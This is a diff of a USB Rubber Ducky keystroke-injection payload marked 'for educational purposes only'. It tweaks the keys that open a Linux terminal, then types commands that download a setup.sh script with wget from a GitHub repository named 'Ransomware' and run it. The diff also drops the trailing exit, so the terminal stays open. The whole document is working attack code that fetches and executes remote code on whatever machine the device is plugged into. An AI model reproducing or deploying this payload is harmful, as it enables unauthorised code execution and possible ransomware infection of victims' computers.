@@ -1,11 +1,21 @@
 REM Rubber Ducky Payload – Full setup with venv
 REM For educational purposes only
 
-DELAY 500
-GUI t
-DELAY 300
+REM DELAY 500
+REM GUI t
+REM DELAY 300
+
+
+
+
+DELAY 800
+CTRL ALT t
+DELAY 600
+GUI
+DELAY 700
 STRING cd ~/Desktop && wget https://raw.githubusercontent.com/Google-design/Ransomware/main/scripts/setup.sh
 ENTER
 DELAY 500
-STRING chmod +x setup.sh && ./setup.sh ; exit
+REM STRING chmod +x setup.sh && ./setup.sh ; exit
+STRING chmod +x setup.sh && ./setup.sh
 ENTER
